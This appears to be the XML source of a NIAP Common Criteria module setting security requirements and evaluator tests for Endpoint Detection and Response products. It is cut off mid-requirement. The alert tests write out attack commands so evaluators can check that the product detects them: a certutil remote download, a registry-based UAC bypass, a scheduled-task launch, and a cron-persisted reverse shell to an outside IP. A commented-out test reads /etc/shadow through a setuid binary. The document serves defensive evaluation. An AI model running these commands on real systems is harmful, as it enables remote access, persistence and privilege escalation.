<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="..\transforms\module2html.xsl"?>

<?xml-model href="../transforms/schemas/CCModule.rng" type="application/xml" schematypens="http://relaxng.org/ns/structure/1.0"?>

<Module xmlns="https://niap-ccevs.org/cc/v1" xmlns:h="http://www.w3.org/1999/xhtml"
  name="Endpoint Detection and Response (EDR)" boilerplate="yes"
  target-products="Endpoint Detection and Response (EDR)">

  <PPReference>
    <ReferenceTable>
      <PPVersion>1.0</PPVersion>
      <PPAuthor>National Information Assurance Partnership</PPAuthor>
      <PPPubDate>2020-01-31</PPPubDate>
      <Keywords>EDR, ESM</Keywords>
    </ReferenceTable>
  </PPReference>

  <RevisionHistory>
    <entry>
      <version>1.0</version>
      <date>2020-01-31</date>
      <subject>Draft - first version released</subject>
    </entry>
  </RevisionHistory>


  <chapter title="Introduction" id="int">
    <section title="Overview" id="ppoverview"> This Protection Profile (PP) Module describes the
      security functionality of Endpoint Detection and Response (EDR) systems in terms of 
      CC, and defines functional and assurance requirements for such products. EDR is
      enterprise management software that collects endpoint host data to detect potentially
      unauthorized activity on endpoints and to enable threat hunting and other incident response
      actions to remediate malicious behaviors. These requirements cover basic security characteristics 
      and behaviors for EDR products; the platform on which the EDR runs may be a physical or virtual 
      Operating System (OS), and on-premises or in a cloud environment. <h:br/>
      
      <h:br/> EDR products rely on additional software running on the endpoint, called the Host
      Agent, to communicate commands or policy changes and to receive endpoint host data. Security
      requirements for the Host Agent are addressed in the separate <cite linkend="bibHAGT"/>
      Module. Evaluation of an EDR system will require evaluations of different system components 
      consisting of EDR and <cite linkend="bibHAGT"/>. Each evaluation must satisfy the requirements 
      in both the [MOD_EDR_V1.0] or [MOD_HA_V1.0] in addition its Base-PP [PP APP V1.3].
      
      
      Evaluation of an EDR system will require multiple evaluations of different system
      components: one against this ESM EDR Module for the EDR and at least one other
      against the <cite linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <h:br/>
      <h:br/> There are two primary architectural categories addressed by requirements in this
      PP-Module, as seen in Figure 1.
      <h:ul>
        <h:li>Endpoints communicate over the Internet to an EDR hosted by a cloud service provider (Software as a Service).</h:li>
        <h:li>Endpoints communicate with an on-premises EDR in a hub and spoke network model.</h:li>
      </h:ul>
      <figure entity="images/edr_archi.png" title="Primary EDR Architectures" id="toe"/>
    </section>
    <tech-terms>
      <term abbr="AES" full="Advanced Encryption Standard"/>
      <term abbr="ANSI" full="American National Standards Institute"/>
      <term abbr="API" full="Application Programming Interface"/>
      <term abbr="ASLR" full="Address Space Layout Randomization"/>
      <term full="Alert">An event or notification on the management dashboard that highlights
        potentially unauthorized activity. 
      </term>
      <term abbr="CESG" full="Communications-Electronics Security Group"/>
      <term abbr="CMC" full="Certificate Management over CMS"/>
      <term abbr="CMS" full="Cryptographic Message Syntax"/>
      <term abbr="CN" full="Common Names"/>
      <term abbr="CRL" full="Certificate Revocation List"/>
      <term abbr="CSA" full="Computer Security Act"/>
      <term abbr="DEP" full="Data Execution Prevention"/>
      <term abbr="DES" full="Data Encryption Standard"/>
      <term abbr="DHE" full="Diffie-Hellman Ephemeral"/>
      <term abbr="DNS" full="Domain Name System"/>
      <term abbr="DRBG" full="Deterministic Random Bit Generator"/>
      <term abbr="DSS" full="Digital Signature Standard"/>
      <term abbr="DT" full="Date/Time Vector"/>
      <term abbr="DTLS" full="Datagram Transport Layer Security"/>
      <term abbr="EAP" full="Extensible Authentication Protocol"/>
      <term abbr="ECDHE" full="Elliptic Curve Diffie-Hellman Ephemeral"/>
      <term abbr="ECDSA" full="Elliptic Curve Digital Signature Algorithm"/>
      <term abbr="EDR" full="Endpoint Detection and Response"/>
      <term abbr="EST" full="Enrollment over Secure Transport"/>
      <term full="Endpoint">A computing device that runs a general purpose OS, a mobile
        device OS, or network device OS. Endpoints can include desktops, servers, and mobile devices.
      </term>
      <term full="Endpoint Detection and Response" abbr="EDR">Server software that analyzes collected EDR Host Agent data for detecting,
        investigating, and remediating unauthorized activities on endpoints. The terms
        <h:i>TOE</h:i> and <h:i>EDR</h:i> are interchangeable in this
        document.
      </term>
      <term full="Endpoint Detection and Response System" abbr="EDR">The EDR server and the Host Agents they operate with.
      </term>
      <term full="Enroll">The act of registering a HA endpoint with the EDR.</term>
      <term abbr="FIPS" full="Federal Information Processing Standards"/>
      <term abbr="DSS" full="Digital Signature Standard"/>
      <term abbr="HMAC" full="Hash-based Message Authentication Code"/>
      <term full="Host Agent">Complementary software that executes on endpoints to collect data about the
        endpoint and executes commands sent to the endpoint from an Enterprise Security Management
        (ESM) server or service. An example command sent to an endpoint could be to enforce a
        policy from an ESM, to collect some files, or to run an OS command. 
      </term>
      <term abbr="HTTP" full="Hypertext Transfer Protocol"/>
      <term abbr="HTTPS" full="Hypertext Transfer Protocol Secure"/>
      <term abbr="DSS" full="Digital Signature Standard"/>
      <term abbr="IETF" full="Internet Engineering Task Force"/>
      <term abbr="IP" full="Internet Protocol"/>
      <term abbr="ISO" full="International Organization for Standardization"/>
      <term abbr="IT" full="Information Technology"/>
      <term abbr="ITSEF" full="Information Technology Security Evaluation Facility"/>
      <term full="Management Dashboard">A management interface for the configuration of EDR policy, visualization
        of collected endpoint alert data, and issuing of remediation commands.
      </term>
      <term abbr="NFC" full="Near Field Communication"/>
      <term abbr="NIAP" full="National Information Assurance Partnership"/>
      <term abbr="NIST" full="National Institute of Standards and Technology"/>
      <term abbr="OCSP" full="Online Certificate Status Protocol"/>
      <term abbr="OID" full="Object Identifier"/>
      <term abbr="OMB" full="Office of Management and Budget"/>
      <term abbr="OS" full="Operating System"/>
      <term abbr="PII" full="Personally Identifiable Information"/>
      <term abbr="PKI" full="Public Key Infrastructure"/>
      <term abbr="PP" full="Protection Profile"/>
      <term full="Potentially Unauthorized Activity">This refers to the set of activities detected by the TOE, specific items detected may be unique to the TOE</term>
      <term abbr="RBG" full="Random Bit Generator"/>
      <term abbr="RFC" full="Request for Comment"/>
      <term abbr="RNG" full="Random Number Generator"/>
      <term abbr="RNGVS" full="Random Number Generator Validation System"/>
      <term abbr="SAN" full="Subject Alternative Name"/>
      <term abbr="SAR" full="Security Assurance Requirement"/>
      <term abbr="SFR" full="Security Functional Requirement"/>
      <term abbr="SHA" full="Secure Hash Algorithm"/>
      <term abbr="S/MIME" full="Secure/Multi-purpose Internet Mail Extensions"/>
      <term abbr="SIP" full="Session Initiation Protocol"/>
      <term abbr="SWID" full="Software Identification"/>
      <term full="SOC Analyst">Security Operations Center (SOC) Analyst is typically the person
        responsible for reviewing potentially unauthorized activities via alerts and
        performing remediation and clean up.
      </term>
      <term abbr="TLS" full="Transport Layer Security"/>
      <term abbr="URI" full="Uniform Resource Identifier"/>
      <term abbr="URL" full="Uniform Resource Locator"/>
      <term abbr="USB" full="Universal Serial Bus"/>
      <term abbr="XCCDF" full="eXtensible Configuration Checklist Description Format"/>
      <term abbr="XOR" full="Exclusive Or"/>
    </tech-terms>

    <section title="Compliant Targets of Evaluation" id="TOEdescription">
      <subsection title="TOE Boundary" id="TOEboundary"> The TOE boundary for the EDR encompasses
        all the software from the TOE vendor that represents the server or enterprise management
        side of the EDR System. This will typically, but not always, be software running behind a
        web application or dashboard, and possibly with other software services running to send and
        receive data with a Host Agent. The EDR may also make use of a database to store collected
        and analyzed data. Any database software itself is outside the scope of the TOE, as is any
        web server software used to serve a web application or dashboard, and the underlying
        operating system or cloud platform. The figure below shows EDR (right) communicating with
        its Host Agent (left) over an untrusted network. <h:br/> The requirements for the Host Agent
        are not covered in this Module, however it is expected that an ESM System will evaluate
        against this ESM EDR Module for the EDR and the <cite
          linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <figure
          entity="images/edr_overview.png" title="EDR and Host Agent Communications" id="toe"/>
      </subsection>
      <subsection title="TOE Platform" id="TOEplatform"> The TOE platform, which consists of the
        OS or Cloud platform on which the EDR software executes and is outside the
        scope of evaluation. However, the security of the EDR relies upon it. <h:br/> Any
        communications with trusted remote file reputation or threat intelligence services is
        relevant to overall EDR System security but is also outside the scope of evaluation.
      </subsection>
    </section>

    <section title="Use Cases" id="usecases"> Requirements in this PP-Module are designed to address
      the security problems in at least the following use cases. An EDR's functionality may be
      extended by addons, plugins, threat feeds, or other reputation services. These are out of
      scope of this Module. <usecases>
        <usecase title="Detection of Potential Unauthorized Activity" id="detect">
          <description>The detection of potentially unauthorized activity, software, or users is
            enabled by the collection of host-based endpoint data to a central EDR where the data is
            analyzed. </description>
        </usecase>
        <usecase title="Remediation of Malicious Activity" id="response">
          <description>The ability to initiate remediation commands to attempt a clean up of
            detected malicious activity is a key use case of EDR. </description>
        </usecase>
        <usecase title="Discovery" id="discovery">
          <description>The capability to effectively browse, query, and export aggregated host-based
            endpoint data enables a SOC analyst to discover adversaries in post-compromise
            scenarios. </description>
        </usecase>
      </usecases>
    </section>
  </chapter>

  <chapter title="Conformance Claims" id="conf">
     <cclaims>
      <cclaim title="Conformance Statement">
        <description> This <abbr linkend="PP-Module"/> inherits exact conformance as required from
          the specified <abbr linkend="Base-PP"/> and as defined in the <abbr linkend="CC"/> and
            <abbr linkend="CEM"/> addenda for Exact Conformance, Selection-Based SFRs, and Optional
          SFRs (dated May 2017).<h:br/><h:br/> 
        </description>
      </cclaim>
      <cclaim title="CC Conformance Claims">
        <description>This <abbr linkend="PP-Module"/> is conformant to Parts 2 (extended) and 3
          (conformant) of Common Criteria Version 3.1, Release 5 [<abbr linkend="CC"/>].
        </description>
      </cclaim>
      <cclaim title="Package Claims">
        <description>This <abbr linkend="PP-Module"/> is TLS Package Version 1.1
          Conformant.</description>
      </cclaim>
    </cclaims>
  </chapter>

  <chapter title="Security Problem Description" id="spd"> The security problem is described in terms
    of the threats that the EDR is expected to address, assumptions about the
    operational environment, and any organizational security policies that the EDR
    is expected to enforce.
    <section title="Threats" id="threats">
      <threats>
        
        
        <threat id="T.MISCONFIGURATION">
          <description>An attacker is a legitimate privileged user with access to change
            the configuration of the EDR's security capabilities. Attackers may
            attempt to hide malicious activities from other privileged users.</description>
          <objective-refer ref="O.MANAGEMENT">
            <rationale>The threat T.MISCONFIGURATION is countered by O.MANAGEMENT as this
            provides for management and audit of administrative activities.</rationale>
          </objective-refer>
        </threat>
        <threat id="T.CREDENTIAL_REUSE">
          <description>An attacker is positioned on a communications channel or elsewhere on the
            network infrastructure. Attackers may guess or harvest legitimate credentials from the
            EDR, endpoints, or insecure network activity.</description>
          <objective-refer ref="O.PROTECTED_TRANSIT">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_TRANSIT as this
              provides for confidentiality of transmitted data.</rationale>
          </objective-refer>
          <objective-refer ref="O.PROTECTED_STORAGE">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_STORAGE (from <cite linkend="bibAppPP"/>) as this
              provides for confidentiality of locally stored credentials.</rationale>
          </objective-refer>
          <!-- 
          <objective-refer ref="O.PROTECTED_MEMORY">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_MEMORY as this
              provides for confidentiality of data in use.</rationale>
          </objective-refer>  -->
        </threat>
      </threats>
    </section>
    <section id="Assumptions" title="Assumptions">
      <assumptions>
        <assumption id="A.CONNECTIVITY">
          <description>The EDR relies on network connectivity to carry out its
          management activities. The OE will provide reliable network connectivity for the EDR to operate.
            The EDR will robustly handle occasional instances when
          connectivity is unavailable or unreliable.</description>
          <objective-refer ref="OE.RELIABLE_TRANSIT">
            <rationale>The Operational Environment objective OE.RELIABLE_TRANSIT is realized through
            A.CONNECTIVITY.</rationale>
          </objective-refer>
        </assumption>
        
       
      </assumptions>
    </section>
    <section title="Organizational Security Policies" id="OSPs">
      This PP-Module defines no additional organizational security policies beyond those defined in the Base-PP.
    </section>
  </chapter>

  <chapter title="Security Objectives" id="obj">
    <section title="Security Objectives for the TOE" id="SecurityObjectivesTOE">
      <SOs>
        <SO id="O.MANAGEMENT">
          <description>The TOE must facilitate management by the enterprise,
            providing consistent and supported interfaces for their security-relevant configuration,
            maintenance, and operation.</description>
          <addressed-by>FAU_ALT_EXT.1, FAU_COL_EXT.1, FMT_SMF.1(1), FMT_SMF.1(2), FMT_SMR.1, FMT_SRF_EXT.1, FMT_TRM_EXT.1 (objective)</addressed-by>
          <consistency-rationale>This objective extends the Base-PP's O.MANAGEMENT
            objective by supporting the management functions that are specific to the EDR TOE type.
          </consistency-rationale>
        </SO>
        <SO id="O.ACCOUNTABILITY">
          <description>The TOE must provide logging facilities which record
            management actions undertaken by identified and authenticated management users.</description>
          <addressed-by>
            FAU_GEN.1, FIA_PWD_EXT.1, FIA_AUT_EXT.1
          </addressed-by>
          <consistency-rationale>This objective relates to the ability of the TOE to identify and authenticate users, and
            to record the behavior of these users. The Base-PP does not define an authentication mechanism so this objective
            does not affect the enforcement of the Base-PP's SFRs.
          </consistency-rationale>
        </SO>
        <SO id="O.PROTECTED_TRANSIT">
          <description>To address both passive (eavesdropping) and active (packet modification)
            network attack threats, conformant TOE
              s will use a trusted channel to protect all communications. Sensitive data
            includes cryptographic keys, passwords, and any other data specific to the application
            that should not be exposed outside of the application or to unauthenticated users.</description>
          <addressed-by>FCS_DTLSS_EXT.1 (from TLS Package), FCS_DTLSC_EXT.1 (from TLS Package), FCS_HTTPS_EXT.1 (from Base-PP), 
            FCS_TLSC_EXT.1 (from TLS Package), FCS_TLSC_EXT.2 (from TLS Package), FCS_TLSS_EXT.1 (from TLS Package), 
            FCS_TLSS_EXT.2 (from TLS Package), FTP_ITC.1, FTP_TRP.1</addressed-by>
          <consistency-rationale>This objective extends the Base-PP's O.COMMS
            objective by ensuring that the communications related to the EDR and
            enrolled Host Agents are secured in the same manner as other sensitive data.
          </consistency-rationale>
        </SO>
      </SOs>
    </section>
    <section title="Security Objectives for the Operational Environment"
      id="SecurityObjectivesTOEorEnvironment">The following security objectives for the operational
      environment assist the EDR in correctly providing its security functionality. These track with
      the assumptions about the environment. <SOEs>
        
        <SOE id="OE.RELIABLE_TRANSIT">
          <description>Wired or wireless network traffic between the EDR and
            host agents will be consistently and always available unless specific in evaluation
            activity tests.</description>
          <consistency-rationale> This objective relates to an external interface that does not exist in the Base-PP
          and does not affect Base-PP functionality.</consistency-rationale>
        </SOE>
      </SOEs>
    </section>
    <section id="secconrat" title="Security Objectives Rationale"> </section>
  </chapter>

  <chapter title="Security Requirements" id="req">

    <base-pp product="application" version="1.3" name="Application Software" short="App"
      url="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=394&amp;id=394"
      xmlurl="https://raw.githubusercontent.com/commoncriteria/application/c51970161d3a47fe8a7c23552f372745a638ba7d/input/application.xml">
      <sec-func-req-dir>
In a PP-Configuration that includes App PP, the TOE is expected to rely on some of the security functions implemented by the application as a whole and evaluated against the Base-PP.
The SFRs listed in this section are defined in the Base-PP and relevant to the secure operation of the EDR.
This section describes any modifications that the ST author must make to the Base-PP SFRs to satisfy the required EDR functionality.
      </sec-func-req-dir>
      <modified-sfrs/>
      <additional-sfrs/>

      <con-toe> If this PP-Module is used to extend the Application Software PP, the TOE type for
        the overall TOE is still a software-based application. The TOE boundary is simply extended
        to include the EDR functionality that is built into the application so that additional
        security functionality is claimed within the scope of the TOE. </con-toe>

      <con-sec-prob/>
      <con-obj/>
      <con-op-en> This PP-Module does not define any objectives for the TOE's operational
        environment. </con-op-en>
      
      
      
      <con-mod id="T.MISCONFIGURATION">This threat applies to management functionality that is introduced in this PP-Module and does not affect the functionality described by the Base-PP.</con-mod>
      <con-mod id="T.CREDENTIAL_REUSE">This threat applies to authentication functionality that is introduced in this PP-Module and does not affect the functionality described by the Base-PP.</con-mod>

    </base-pp>

    <man-sfrs>
        <subsection title="Security Audit (FAU)" id="fau">

          <ext-comp-def fam-id="FAU_ALT_EXT" title="Server Alerts">
            <mod-def>Components in this family define requirements for system activity that causes the TSF to generate an alert of the activity and for the contents of these alerts.</mod-def>
          </ext-comp-def>

          <f-component id="fau_alt_ext.1" name="Server Alerts">
            
            <consistency-rationale> This SFR defines auditable alerts for the EDR. It does not
              impact the <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
            
            <comp-lev> describes alert triggers and the information contained in alerts.</comp-lev>
            <management>The following actions could be considered for the management functions in FMT: <h:ul>
              <h:li>Configure visual suppression of alerts.</h:li>
            </h:ul></management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>No dependencies.</dependencies>
            
            
            <f-element>
              <title>The EDR shall alert authorized users on a management dashboard
                in the event of any of the following: <h:ol type="a">
                  <h:li>Change in Host Agent enrollment status</h:li>
                  <h:li>Detection of potentially unauthorized activity on enrolled endpoints</h:li>
                </h:ol>
              </title>
              <note role="application"> The intent of this requirement is to specify the minimum set
                of management dashboard alert capabilities the EDR must be capable
                of displaying to an authorized user. <h:br/><h:br/>
                Examples of Detection of potentially unauthorized activity on enrolled endpoints include;
                anomalous activity, escalation of privileges, and lateral movement.
              </note>
            </f-element>
            <f-element>
              <title>The EDR shall provide a visualization of detected alerts of
                potentially unauthorized incidents, and shall include: <h:ol type="a">
                  <h:li>An initial incident severity and <selectables>
                      <selectable>assessment</selectable>
                      <selectable>categorization</selectable>
                      <selectable>score</selectable>
                      <selectable>ranking</selectable>
                    </selectables>
                  </h:li>
                  <h:li>An incident timeline</h:li>
                </h:ol>
              </title>
              <note role="application"> The intent of this requirement is to specify the minimum set
                of incident visualizations the EDR must be capable of displaying
                to an authorized user. Visualization is broadly defined as the display of incident
                data to an authorized user on the management dashboard. The visualization is not
                required to be interactive. </note>
            </f-element>
            <f-element>
              <title>The EDR shall provide a data export capability for
                  selected alerts with a specified standards-based format of <selectables
                  linebreak="yes">
                  <selectable>Structured Threat Information eXpression (STIX)</selectable>
                  <selectable>Cyber Observable eXpression (CybOX)</selectable>
                  <selectable>Incident Object Description Exchange Format (IODEF)</selectable>
                  <selectable>Common Event Format (CEF)</selectable>
                  <selectable>Log Event Extended Format (LEEF)</selectable>
                </selectables>. </title>
              <note role="application"> The intent of this requirement is to specify a selection of
                standards-based formats the EDR must provide for the export of selected alerts, at least one must be selected. </note>
              <aactivity>
                  <TSS>
                    The evaluator shall examine the TSS to ensure that it describes how alerts for changes in Host Agent
                    enrollment status and potentially unauthorized activities on enrolled endpoints are detected and displayed. 
                    The evaluator shall examine the TSS to ensure it contains the
                    list of unauthorized activity types categorized or labeled by the EDR upon
                    detection.<h:br/><h:br/>
                    
                    The evaluator shall examine the TSS to ensure that it describes how alert visualizations 
                    are displayed and what content is included.<h:br/><h:br/>
                  
                  The evaluator shall examine the TSS to ensure that it describes what formats are supported.</TSS>
                
                <Guidance>
                  The evaluator shall review operational guidance to ensure that it
                  contains documentation on enrolling and unenrolling Host Agents from the
                  EDR.<h:br/><h:br/>
                  
                  The evaluator shall review operational guidance to identify a
                  list of unauthorized activity types categorized or labeled by the EDR upon
                  detection.<h:br/><h:br/>
                  
                  The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
                  in relation to changes in Host Agent enrollment status and potentially unauthorized activities.<h:br/><h:br/>
                  
                  The evaluator shall review the operational guidance to ensure that it
                  contains documentation on using the management dashboard to visualize and view
                  alerts. 
                  
                  <h:br/><h:br/>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on the products supported for exporting alerts in standards-based formats.</Guidance>
                
                <Tests> 
                  The evaluator shall perform the following tests:<h:br/><h:br/>
                  The evaluator shall follow guidance to unenroll a Host Agent from the
                  EDR and verify that the unenrollment action is recorded in an auditable and
                  timestamped activity log. 
                  <h:br/>
                  <h:br/>
                  The evaluator
                  shall follow guidance to enroll a Host Agent to the EDR and verify that the
                  enrollment action is recorded in an auditable and timestamped activity log.<h:br/><h:br/>
                  <h:b>For Windows,</h:b> the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following sub-tests on an enrolled Host Agent's
                  system for each platform list that is supported, verifying for each that corresponding
                  alerts were generated in the management dashboard, the test passes if an alert of the appropriate type is generated:<h:br/>
                  <testlist>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>cmd /c certutil -urlcache -split -f &#60;remote file&#62;
                        &#60;download directory&#62;</h:code>, where the remote file is a valid file path
                      to an accessible, remotely stored executable, and the download directory is a
                      valid directory path writable by the current local user. </test>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
                        /ve /d "&#60;local executable&#62;" /f</h:code>, where the local executable is a
                      valid file path to a readable, local executable. The evaluator will then run
                      the command <h:code>cmd.exe /c eventvwr.msc</h:code> in the same command
                      prompt window. </test>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>SCHTASKS /Create /SC ONCE /TN spawn /TR &#60;local
                        executable&#62;" /ST &#60;time&#62;</h:code>, where the local executable is a
                      valid file path to a readable, local executable, and time is a start time that
                      occurs within minutes of the task being created. </test>
                  </testlist>
                  <h:b>For Linux,</h:b> the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following subtests based on the platform of
                  the enrolled Host Agent's system, verifying for each that corresponding alerts
                  were generated in the management dashboard::<h:br/>
                  <testlist>
                    <test>The evaluator shall open a terminal and run the command <h:code>scp
                      &#60;remote user&#62;@&#60;remote host&#62;:&#60;remote path&#62;
                      &#60;download directory&#62;</h:code>, where the remote user is a valid user on
                      remote host, remote path is a valid path to a remotely stored executable, and the 
                      download directory is a valid directory path writable by the current local
                      user. The remote user's password shall be provided when prompted. </test>
                    <!-- The exe for this was not created, consider creating this for next version.
                      <test>The evaluator shall open a terminal and run the command <h:code>sudo chown
                      root &#60;provided executable&#62;</h:code> and <h:code>sudo chmod u+s
                        &#60;provided executable&#62;</h:code> before executing the program with
                      <h:code>./&#60;provided executable&#62; &#60; "cat /etc/shadow"</h:code>.
                      The user's administrative password shall be provided when prompted.</test> -->
                    <test>The evaluator shall open a terminal and run the command <h:code>echo
                      "bash -i >&amp; /dev/tcp/&#60;outside IP&#62;/5050 0>&amp;1 1 &amp;" &#62; 
                      /etc/cron.hourly/persist</h:code>, where the outside IP is a valid
                      external address.</test>
                  </testlist>
                  <h:b>For all platforms:</h:b>
                  <testlist>
                    <test>The evaluator shall review an alert on the management dashboard and verify that
                      the alert contains a severity field and the fields specified in the ST.
                      The evaluator will open or view the alert and verify that a timeline of
                      events is available for review. The timeline shall show a progression of events
                      over time.</test>
                    <test>The evaluator shall pick an alert on the management dashboard and export the
                      alert in every format specified in the ST. The evaluator shall review the operational
                      guidance and the selection from the requirement and verify that export options
                      exist for all the declared formats in the selection. After exporting one alert for
                      each possible format the evaluator shall review the file contents of the exported
                      alert and verify it is the correct format for the selected export option (for
                      example, an export of the IODEF type must contain 'IODEF-Document' in the first
                      element of the exported file). </test>
                </testlist></Tests>
              </aactivity>
            </f-element>
          </f-component>

          
          <ext-comp-def fam-id="FAU_COL_EXT" title="Collected Endpoint Data">
            <mod-def>Components in this family define requirements for the data that is collected from a Host Agent.</mod-def>
          </ext-comp-def>
          

          <f-component id="fau_col_ext.1" name="Collected Endpoint Data">
            <consistency-rationale> This SFR defines the minimum event data that the EDR collects
              from a Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>

            <comp-lev> identifies the specific data collected from a Host Agent.</comp-lev>
            <management>The following actions could be considered for the management functions in FMT: <h:ul>
              <h:li>Configuration of the time period for transmission of collected data.</h:li>
              <h:li>Configuration of label or tag information to associate collected data with individual endpoint systems or groups of systems.</h:li>
            </h:ul></management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>No dependencies.</dependencies>

            <f-element>
              <title>The EDR shall collect the following minimum set of endpoint
                data from a Host Agent: <h:ol type="a">
                  <h:li>Operating System (OS) version, architecture, and IP Address</h:li>
                  <h:li>Privileged and unprivileged endpoint account login activity</h:li>
                  <h:li>Process creation</h:li>
                  <h:li>Libraries and modules loaded by processes</h:li>
                  <h:li>Filenames and <assignable>other metadata</assignable> of files created and <assignable>other activities performed to files</assignable>on persistent storage</h:li>
                  <h:li><assignable>Other host data</assignable></h:li>
                </h:ol>
              </title>
              <note role="application">The intent of this requirement is to specify the minimum set
                of endpoint data that the EDR must be capable of collecting. The assignments may be empty, a single item, or multiple items.</note>
              <aactivity>
                <TSS>The evaluator shall verify that all supported endpoint event data types are described.</TSS>
                <Guidance>The evaluator shall review the operational guidance and ensure that it
                  lists all of the collectable types of endpoint event data.</Guidance>
                <Tests>The evaluator shall perform the following tests:
                  <testlist>
                    <test>The evaluator shall verify the OS version, architecture, and IP address of
                    a system managed by a Host Agent against the data reported to the EDR.</test>
                    <test>The evaluator shall login to a system managed by a Host Agent with two separate
                    accounts and verify that the activity is accurately reported to the EDR.</test>
                    <test>The evaluator shall run a known user application provided on the platform OS and verify
                    that subsequent process creation and module loading is accurately reported to the EDR.</test>
                    <test>The evaluator shall create a new non-empty document within persistent storage and verify
                    that the activity is accurately reported to the EDR.</test>
                    <test>The evaluator shall perform an action that causes an event 
                      to occur for all items in the assignment and verify the activity is reported to the EDR.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>
          
          
        
          
          <f-component id="fau_gen.1" name="EDR Audit Generation">
            <consistency-rationale> This SFR defines the minimum event data that the EDR server must
              record about authorized management dashboard activity. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            
            <comp-lev> defines audiable events for the use of the EDR management functionality.</comp-lev>
            <management>There are no specific management functions identified.</management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>FMT_SMF.1 Specification of Management Functions</dependencies>

         
            <f-element>
              <title>The EDR shall generate an audit record of the following auditable events: 
                  <h:li>EDR management dashboard login activity</h:li>
                  <h:li>Remediation commands sent to a Host Agent, affected endpoint, or network
                    devices</h:li>
                  <h:li>EDR configuration changes</h:li>
                  <h:li><assignable>Other auditable events</assignable></h:li>
                
              </title>
             
              
              
              <note role="application">The intent of this requirement is to specify the minimum set
                of audit records generated about actions on the EDR. </note>
              
            </f-element>
            
            <f-element>
            <title> The EDR shall record within each audit record at least the following information: <h:ul>
              <h:li>date and time of the event</h:li>
              <h:li>type of event</h:li>
              <h:li>subject identity</h:li>
              <h:li>(if relevant) the outcome (success or failure) of the event</h:li>
              <h:li><assignable>other audit relevant information</assignable>.</h:li>
            </h:ul>
            </title>
            <note role="application"> This requirement outlines the information to be included in audit records. All audits must 
              contain at least the information mentioned in FAU_GEN.1.2, but may contain more information 
              which can be assigned. 
              </note>
            <aactivity>
              <TSS>The evaluator shall check the TSS and ensure that it lists all of the auditable events claimed in the SFR. 
                The evaluator shall check to make sure that every audit event type specified by the SFR is described in the TSS. <h:br/><h:br/>
                The evaluator shall check the TSS and ensure that it provides a format for audit records. 
                Each audit record format type must be covered, along with a brief description of each field.<h:br/><h:br/>
              </TSS>                            
              
              <Guidance> The evaluator shall check the administrative guide and ensure that it lists all of the auditable events claimed in the SFR. 
                The evaluator shall check to make sure that every audit event type mandated by the SFR is described.<h:br/><h:br/> 
                The evaluator shall examine the administrative guide and make a determination of which 
                commands are related to the configuration (including enabling or disabling) 
                of the mechanisms implemented in the EDR that are necessary to enforce the 
                requirements specified in the PP-Module. The evaluator shall document the methodology or 
                approach taken while determining which actions in the administrative guide are security relevant with 
                respect to this PP-Module. The evaluator may perform this activity as part of the activities 
                associated with ensuring the AGD_OPE guidance  satisfies the requirements.<h:br/><h:br/>
                The evaluator shall check the administrative guide and ensure that it provides a format for audit records. 
                Each audit record format type must be covered, along with a brief description of each field. The evaluator shall 
                check to make sure that the description of the fields contains the information required in FAU_GEN.1.2.<h:br/><h:br/>
              </Guidance>
              <Tests>The evaluator shall perform the following tests:
                <testlist>
                  <test>The evaluator shall login to the EDR management dashboard and verify that audit
                    log data describing the activity is recorded.</test>
                  <test>The evaluator shall issue a valid remediation command provided by the EDR to
                    a Host Agent and verify that audit log data describing the activity is recorded on the EDR management dashboard.</test>
                  <test>The evaluator shall change a non-destructive EDR configuration option within the EDR management
                    dashboard, change it back to the original setting, and verify that the audit log data describing
                    the activity is recorded.</test>
                  <test>The evalutor shall perform the action to generate all other auditable 
                    events listed in the assignement and verify the activity is recorded.</test>
                </testlist>
                When verifying the test results from FAU_GEN.1.1, the evaluator shall ensure the audit records generated during 
                testing match the format specified in the administrative guide, and that the fields in each audit record have the proper entries.
                <h:br/><h:br/> 
                Note that the testing here can be accomplished in conjunction with the testing of the security mechanisms directly. 
                For example, testing performed to ensure that the administrative guidance provided is correct verifies that AGD_OPE.1 
                is satisfied and should address the invocation of the administrative actions that are needed to verify the audit records 
                are generated as expected.<h:br/><h:br/>
              </Tests>
            </aactivity>
          </f-element>
          </f-component>







        </subsection>

        <subsection title="Identification and Authentication (FIA)" id="fia">

  
          
          <ext-comp-def fam-id="FIA_PWD_EXT" title="Password Authentication">
            <mod-def>Components in this family define requirements for password authentication criteria.</mod-def>
          </ext-comp-def>

          <f-component id="fia_pwd_ext.1" name="Password Authentication">
            <consistency-rationale> This SFR defines specific authentication criteria for
              passwords. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            
            <comp-lev> defines the length and character set requirements for password authentication factors.</comp-lev>
            <management>No specific management functions are identified.</management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>FIA_AUT_EXT.1 Dashboard Authentication Mechanisms</dependencies>
            
            <f-element>
              <title>The EDR shall support the following for the Password
                Authentication Factor: <h:ol>
                  <h:li>Passwords shall be able to be composed of any combination of <selectables>
                      <selectable>upper and lower case letters</selectable>
                      <selectable><assignable>a character set of at least 52
                        characters</assignable></selectable>
                    </selectables>, numbers, and special characters: <selectables>
                      <selectable>"!"</selectable>
                      <selectable>"@"</selectable>
                      <selectable>"#"</selectable>
                      <selectable>"$"</selectable>
                      <selectable>"%"</selectable>
